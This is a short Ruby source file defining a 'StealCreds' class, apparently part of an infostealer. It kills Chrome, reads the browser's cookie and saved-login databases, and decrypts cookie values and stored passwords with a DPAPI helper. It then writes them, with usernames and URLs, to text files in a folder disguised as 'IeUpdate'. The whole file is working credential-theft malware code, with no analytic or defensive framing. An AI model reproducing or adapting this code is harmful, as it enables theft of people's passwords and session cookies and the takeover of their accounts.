require 'optparse'
  require 'ostruct'
  require 'sqlite3'
  require 'cgi'
  require 'csv'
  require 'builder'
  require 'lib/dpapi.rb'
  include DpApi
  class StealCreds
    def chrome_cook
      system("TASKKILL /IM chrome.exe /F")
      db = SQLite3::Database.new(ENV['HOME'] + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies')
      db.results_as_hash = true
      f = File.open(ENV['HOME'] + '\\AppData\\local\\IeUpdate\\Cookie.txt', "a")
      rows = db.execute('SELECT * FROM `cookies`') do |row|
        f.write("HostKey: " + row[0].to_s + "\n")
        f.write("Path:    " + row[1].to_s + "\n")
        f.write("Secure:  " + row[2].to_s + "\n")
        f.write("Expire:  " + row[3].to_s + "\n")
        f.write("Name:    " + row[4].to_s + "\n")
        f.write("Value:   " + DpApi.decrypt(row['encrypted_value']).to_s)
        f.write("\n\n\n\n")
      end
      db.close
      f.close
    end
    def chrome_pass
      system("TASKKILL /IM chrome.exe /F")
      db = SQLite3::Database.new(ENV['HOME'] + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
      db.results_as_hash = true
      f = File.open(ENV['HOME'] + '\\AppData\\local\\IeUpdate\\Pass.txt', "a")
      rows = db.execute('SELECT * FROM `logins`') do |row|
        f.write("OrginUrl:  " + row[0].to_s  + "\n")
        f.write("ActionUrl: " + row[1].to_s  + "\n")
        f.write("PassType:  " + row[12].to_s + "\n")
        f.write("Date:      " + row[10].to_s + "\n")
        f.write("TimeUsed   " + row[13].to_s + "\n")
        f.write("Uname:     " + row[3].to_s  + "\n")
        f.write("Pass:      " + DpApi.decrypt(row[5]).to_s)
        f.write("\n\n\n\n")
      end
      db.close
      f.close
    end
  end